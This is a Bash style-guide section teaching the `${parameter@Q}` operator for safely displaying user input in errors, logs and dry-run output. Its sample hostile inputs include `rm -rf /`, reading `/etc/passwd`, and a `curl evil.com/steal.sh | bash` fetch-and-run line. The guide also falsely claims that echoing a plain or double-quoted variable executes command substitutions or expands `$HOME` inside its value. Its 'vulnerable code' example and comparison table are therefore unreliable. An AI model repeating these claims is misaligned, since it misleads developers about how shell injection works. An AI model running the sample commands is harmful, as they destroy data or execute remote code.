## Parameter Quoting with `${parameter@Q}`

**Use the `${parameter@Q}` shell quoting operator to safely quote parameter values in error messages, logging output, and debugging statements.**

**Rationale:**
- **Prevents injection**: Safely displays user input that might contain shell metacharacters
- **Preserves special characters**: Shows actual content without expansion or interpretation
- **Re-usable output**: Produces shell-quoted strings that can be copy-pasted back into shell
- **Security**: Protects against malicious input in error messages
- **Debugging aid**: Shows exact parameter values including whitespace and special chars

### The `@Q` Operator

**Syntax:** `${parameter@Q}`

**What it does:** Expands to the parameter value quoted in a format that can be re-used as shell input.

**Example:**
```bash
name='hello world'
echo "${name@Q}"      # Output: 'hello world'

name="foo's bar"
echo "${name@Q}"      # Output: 'foo'\''s bar'

name='$(rm -rf /)'
echo "${name@Q}"      # Output: '$(rm -rf /)'
```

### Primary Use Cases

**1. Error Messages**

The most common use: safely displaying user-provided arguments in error messages.

```bash
# Without @Q - Injection risk
die 2 "Unknown option $1"
# Input: --option='`rm -rf /`'
# Output: Unknown option `rm -rf /`  (EXPANDS! Security risk!)

# With @Q - Safe
die 2 "Unknown option ${1@Q}"
# Input: --option='`rm -rf /`'
# Output: Unknown option '`rm -rf /`'  (Literal, safe)
```

**Complete example from argument validation:**
```bash
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"  # Safe parameter quoting
  fi
}

arg2_num() {
  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
    die 2 "${1@Q} requires a numeric argument"  # Safe parameter quoting
  fi
}

# Usage:
./script --depth='$(cat /etc/passwd)'
# Output: '--depth='$(cat /etc/passwd)'' requires a numeric argument
# Note: Command substitution NOT executed, shown literally
```

**2. Logging and Debug Output**

Show exact values of variables for debugging:

```bash
debug() {
  ((DEBUG)) || return 0
  local -- msg="$1"
  shift
  local -- arg
  for arg in "$@"; do
    msg+=" ${arg@Q}"  # Quote each argument
  done
  >&2 echo "[DEBUG] $msg"
}

# Usage:
debug "Processing files:" "$file1" "$file2"
# Output: [DEBUG] Processing files: 'foo bar.txt' 'test  file.txt'
#                                     ^           ^
#                                     Shows spaces clearly
```

**3. Displaying User Input**

When echoing back what the user entered:

```bash
info "You entered ${filename@Q}"
# Input: filename='file with spaces & specials'
# Output: You entered 'file with spaces & specials'

warn "Skipping invalid entry ${entry@Q}"
# Input: entry='$HOME/test'
# Output: Skipping invalid entry '$HOME/test'  (not expanded)
```

**4. Verbose/Dry-Run Mode**

Show exact commands that would be executed:

```bash
run_command() {
  local -a cmd=("$@")

  if ((DRY_RUN)); then
    # Show command with all arguments properly quoted
    local -- quoted_cmd
    printf -v quoted_cmd '%s ' "${cmd[@]@Q}"
    info "[DRY-RUN] Would execute: $quoted_cmd"
    return 0
  fi

  "${cmd[@]}"
}

# Usage:
run_command rm -f "/tmp/file with spaces.txt"
# Output: [DRY-RUN] Would execute: rm -f '/tmp/file with spaces.txt'
```

### Complete Example

```bash
#!/bin/bash
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}

# Messaging functions using @Q for safe parameter display
error() {
  >&2 echo "${RED}✗${NC} ${SCRIPT_NAME}: $*"
}

die() {
  local -i code=${1:-1}
  shift
  (($#)) && error "$@"
  exit "$code"
}

# Argument validators using @Q
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"
  fi
}

arg2_num() {
  if ((${#@}-1<1)) || [[ ! "$2" =~ ^[0-9]+$ ]]; then
    die 2 "${1@Q} requires a numeric argument"
  fi
}

# Debug function showing all arguments
debug() {
  ((DEBUG)) || return 0
  local -- msg="[DEBUG] $SCRIPT_NAME:"
  local -- arg
  for arg in "$@"; do
    msg+=" ${arg@Q}"
  done
  >&2 echo "$msg"
}

# Main argument parsing
main() {
  declare -i DEBUG=0 DRY_RUN=0
  declare -- OUTPUT_FILE=''
  declare -a INPUT_FILES=()

  while (($#)); do case $1 in
    -o|--output)
      arg2 "$@"
      shift
      OUTPUT_FILE="$1"
      ;;

    -d|--debug)
      DEBUG=1
      ;;

    -n|--dry-run)
      DRY_RUN=1
      ;;

    -*)
      die 22 "Invalid option ${1@Q}"  # Safe quoting
      ;;

    *)
      INPUT_FILES+=("$1")
      ;;
  esac; shift; done

  # Debug output shows exact values
  debug "OUTPUT_FILE=$OUTPUT_FILE" "INPUT_FILES=(${INPUT_FILES[*]@Q})"

  # Processing logic...
}

main "$@"
#fin
```

### Comparison Table

| Input Value | `$var` | `"$var"` | `${var@Q}` |
|-------------|--------|----------|------------|
| `hello world` | `hello` `world` (splits) | `hello world` | `'hello world'` |
| `foo's bar` | `foos` `bar` (syntax error) | `foo's bar` | `'foo'\''s bar'` |
| `$(date)` | *executes command* | *executes command* | `'$(date)'` (literal) |
| `*.txt` | *glob expands* | `*.txt` | `'*.txt'` |
| `$HOME/test` | */home/user/test* (expands) | */home/user/test* (expands) | `'$HOME/test'` (literal) |
| Empty string | *(nothing)* | `` (empty) | `''` (quotes shown) |

### When to Use `${var@Q}`

**✓ Use for:**
- Error messages with user input: `die 2 "Invalid option ${opt@Q}"`
- Logging user-provided values: `info "Processing ${filename@Q}"`
- Debug output: `debug "vars:" "${arr[@]@Q}"`
- Dry-run command display: `info "[DRY-RUN] ${cmd@Q}"`
- Showing validation failures: `warn "Rejecting ${input@Q}"`

**✗ Don't use for:**
- Normal variable expansion in logic: `process "$filename"` (not `process "${filename@Q}"`)
- Data output to stdout: `echo "$result"` (not `echo "${result@Q}"`)
- Assignments: `target="$source"` (not `target="${source@Q}"`)
- Comparisons: `[[ "$var" == "$value" ]]` (not with @Q)

### Security Example

Demonstrates why `@Q` is critical for security:

```bash
# Vulnerable code (NO @Q)
validate_input() {
  [[ -z "$1" ]] && die 2 "Option $2 requires argument"
  # User input: --name='`curl evil.com/steal.sh | bash`'
  # Error message executes command: Option `curl evil.com/steal.sh | bash` requires argument
}

# Safe code (WITH @Q)
validate_input() {
  [[ -z "$1" ]] && die 2 "Option ${2@Q} requires argument"
  # User input: --name='`curl evil.com/steal.sh | bash`'
  # Error message shows literally: Option '`curl evil.com/steal.sh | bash`' requires argument
}
```

### Other `@` Operators (for reference)

Bash provides several parameter transformation operators:

| Operator | Purpose | Example |
|----------|---------|---------|
| `${var@Q}` | Quote for shell reuse | `'hello world'` |
| `${var@E}` | Expand escape sequences | `$'hello\nworld'` |
| `${var@P}` | Prompt expansion | *(PS1-style expansion)* |
| `${var@A}` | Assignment form | `var='value'` |
| `${var@a}` | Attributes | `declare -i` → `i` |
| `${var@U}` | Uppercase | `HELLO` |
| `${var@L}` | Lowercase | `hello` |

**For BCS purposes, `@Q` is the most commonly used** for safe parameter display in error messages and logging.

### Anti-Patterns

```bash
# ✗ Wrong - No quoting, injection risk
die 2 "Unknown option $1"

# ✗ Wrong - Double quotes don't prevent expansion
die 2 "Unknown option \"$1\""
# Input: --opt='$(rm -rf /)'
# Still expands: Unknown option "$(rm -rf /)"

# ✗ Wrong - Manual escaping fragile
die 2 "Unknown option '$(sed "s/'/'\\\\''/g" <<<"$1")'"

# ✓ Correct - Use @Q operator
die 2 "Unknown option ${1@Q}"
```

### Integration with Standard Functions

The `@Q` operator integrates seamlessly with standard BCS messaging and validation patterns:

```bash
# Messaging functions (BCS09)
error() { >&2 echo "${RED}✗${NC} $*"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-1}"; }

# Usage with @Q
die 22 "Invalid option ${opt@Q}"  # Safe

# Validation helpers (BCS10)
arg2() {
  if ((${#@}-1<1)) || [[ "${2:0:1}" == '-' ]]; then
    die 2 "${1@Q} requires argument"  # Safe
  fi
}

# Progressive readonly (BCS0205)
readonly -- VERSION SCRIPT_PATH  # Variables themselves
# But when displaying in errors:
info "Using version ${VERSION@Q}"  # Safe display
```

### Summary

**The `${parameter@Q}` operator is critical for:**
1. Security - prevents command injection in error messages
2. Clarity - shows exact values including whitespace
3. Debugging - produces re-usable shell input
4. Consistency - standard way to quote user input across all scripts

**Standard pattern:** Any time you display user input in error messages, warnings, or logs, use `${parameter@Q}`.

**See also:**
- BCS1003 - Argument Validation (uses `@Q` extensively)
- BCS0903 - Core Message Functions (error/die integration)
- BCS0406 - Variables in Conditionals (when NOT to use @Q)
